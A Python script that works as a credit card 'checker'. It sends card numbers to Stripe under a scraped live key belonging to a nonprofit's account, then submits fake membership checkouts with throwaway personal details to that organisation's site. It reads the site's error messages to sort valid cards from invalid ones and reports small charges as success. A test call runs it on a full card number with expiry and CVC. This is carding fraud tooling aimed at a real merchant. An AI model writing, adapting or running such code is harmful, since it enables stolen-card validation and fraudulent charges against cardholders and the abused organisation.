import json
import os
from inc.gw_helper import ParentChecker
from random import randint


URL1 = "https://api.stripe.com/v1/payment_methods"

HEADERS1 = """accept: application/json
accept-encoding: gzip, deflate, br
accept-language: es-MX,es;q=0.9
content-length: 492
content-type: application/x-www-form-urlencoded
origin: https://js.stripe.com
referer: https://js.stripe.com/
sec-ch-ua: "Chromium";v="108", "Not?A_Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-dest: empty
sec-fetch-mode: cors
sec-fetch-site: same-site
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"""

POSTDATA1 = "type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_month]={month}&card[exp_year]={year}&guid=b8d707e3-3bb6-451a-b9ba-b75778eb7a0f06f189&muid=80f2ac97-deb1-4df1-aafa-6fd8fd6de9262faa8b&sid=8a03808c-4a6b-4e18-8b76-eb6a300015fec8da18&pasted_fields=number&payment_user_agent=stripe.js%2F9504e7f7a%3B+stripe-js-v3%2F9504e7f7a&time_on_page=27996&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1KA2OiJpCckd99GE"

URL2 = "https://www.intsocialcapital.org/account/membership-checkout/"

HEADERS2 = """accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
accept-encoding: gzip, deflate, br
accept-language: es-MX,es;q=0.9
cache-control: max-age=0
content-length: 1128
content-type: application/x-www-form-urlencoded
origin: https://www.intsocialcapital.org
referer: https://www.intsocialcapital.org/account/membership-checkout/
sec-ch-ua: "Chromium";v="108", "Not?A_Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"""

# format: rnum(random number), token, ccn, month, year

POSTDATA2 = "level=1&checkjavascript=1&other_discount_code=&username=random{rnum}&bemail=random{rnum}%40gmail.com&bconfirmemail=random{rnum}%40gmail.com&password=Password%2869%29{rnum}&password2=Password%2869%29{rnum}&fullname=&donation_dropdown=5&donation=5&suffix=mr&first_name=aasdsad&last_name=asdad&employment=Academic+-+Research&position=adsad&organization=asdads&phone=5085456987&alt_phone=&address1=street+23&address2=&suburb=ny&state=ny&pocstalcode=10080&country=US&gender=Male&birthday%5Bm%5D=2&birthday%5Bd%5D=14&birthday%5By%5D=1992&autorenew=1&autorenew_present=1&gateway=stripe&CardType={card_type}&discount_code=&tos=1&submit-checkout=1&javascriptok=1&ak_bib=1676338131136&ak_bfs=1676338145180&ak_bkpc=5&ak_bkp=94%2C136%3B101%2C170%3B516%3B96%3B88%2C184%3B&ak_bmc=102%3B126%2C681%3B111%2C7746%3B111%2C5361%3B&ak_bmcc=4&ak_bmk=&ak_bck=&ak_bmmc=11&ak_btmc=0&ak_bsc=2&ak_bte=&ak_btec=0&ak_bmm=167%2C39%3B907%2C592%3B1051%2C597%3B1288%2C1874%3B402%2C1555%3B770%2C795%3B141%2C4192%3B707%2C4266%3B609%2C35%3B121%2C12%3B859%2C3806%3B&payment_method_id={token}&AccountNumber=XXXXXXXXXXXX{ccn}&ExpirationMonth={month}&ExpirationYear={year}"

'''COOKIES3 = """cookie: twp_session=151b88c3c5aa72c772d4fa8ed0932f33%7C%7C1641701312%7C%7C1641700952
cookie: PHPSESSID=1vc8qg27vanaqi0li5uj4boc0e
cookie: pmpro_visit=1
cookie: __stripe_mid=6c8e8d3d-936b-4d85-8da2-7e22af6ffe898d0d34
cookie: __stripe_sid=1fbfe770-80ae-4fe4-9459-da0437abe2ee5f6502"""

COOKIES3 = """
cookie: PHPSESSID=1vc8qg27vanaqi0li5uj4boc0e; pmpro_visit=1; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=no; cookielawinfo-checkbox-performance=no; cookielawinfo-checkbox-analytics=no; cookielawinfo-checkbox-advertisement=no; cookielawinfo-checkbox-others=no; __stripe_mid=80f2ac97-deb1-4df1-aafa-6fd8fd6de9262faa8b; __stripe_sid=8a03808c-4a6b-4e18-8b76-eb6a300015fec8da18; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOmZhbHNlLCJwZXJmb3JtYW5jZSI6ZmFsc2UsImFuYWx5dGljcyI6ZmFsc2UsImFkdmVydGlzZW1lbnQiOmZhbHNlLCJvdGhlcnMiOmZhbHNlfQ==; viewed_cookie_policy=yes
"""'''

class Checker(ParentChecker):
    """Checker credit card. :param card(sapared by |)"""

    def __init__(self, card):

        # This will change to True  if  card iis invlalid when we call super init
        self.invalid = False
        super().__init__(card)
        if self.invalid == True:
            raise ValueError("Invalid Card Format")

        self.request_1_done = False


    def make_request_1(self):
        url = URL1
        headers = super().format_headers(HEADERS1)
        postdata = POSTDATA1.format(ccn= self.ccn, month= self.month, year= self.year, cvc= self.cvc)

        res = self.session.post(url= url, headers= headers, data= postdata)
        res_json = json.loads(res.text)
        try:
            self.token = res_json["id"]
            self.card_type = res_json["card"]["brand"]
            self.request_1_done = True
            return self.token
        except KeyError:
            return "Error: " + res_json["error"]["message"]


    def make_request_2(self):
        """2nd request. return: result"""
        if self.token == None:
            return "Invalid Card Format"
        url = URL2
        headers = super().format_headers(HEADERS2)
        postdata = POSTDATA2.format(token= self.token, ccn= self.ccn[-4:], month= self.month, year= self.year, card_type= self.card_type, rnum= randint(1111, 99999))

        res = self.session.post(url= url, headers= headers, data= postdata)
        result = res.text #brotli.decompress(res.content)
        try:
            result = result.split(r'ass="pmpro_message pmpro_error">', maxsplit= 1)[1].split(r"</div>", maxsplit= 1)[0]
            return result
        except IndexError:
            with open("res.html", "w") as file:
                file.write(result)
            return "Success. Charged 20$!"




def test():
    checker = Checker("5178052520772456|11|2024|601")
    print(checker.make_request_1())
    print(checker.make_request_2())

if __name__== "__main__":
    test()
